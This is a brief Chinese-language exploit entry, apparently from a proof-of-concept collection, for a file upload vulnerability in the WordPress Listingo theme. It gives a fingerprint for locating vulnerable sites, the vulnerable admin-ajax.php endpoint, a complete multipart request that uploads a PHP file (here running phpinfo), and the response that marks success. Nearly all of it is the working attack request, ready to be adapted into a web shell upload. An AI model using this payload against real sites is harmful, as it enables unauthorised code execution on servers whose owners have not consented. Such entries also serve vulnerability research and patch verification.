# WordPresslistingo文件上传漏洞

WordPress ｜ 文件上传 ｜ —
- **指纹**：`body="wp-content/themes/listingo"`
- **请求**：`POST /wp-admin/admin-ajax.php?action=listingo_temp_uploader HTTP/1.1`

**Payload**
```
------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="listingo_uploader";filename="1008.php"
Content-Type:text/php
<?php
phpinfo();
?>
------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="submit"
Start Uploader
------WebKitFormBoundary8rVjnfcgxgKoytcg--
```
- **响应特征**：200 wp-custom-uploader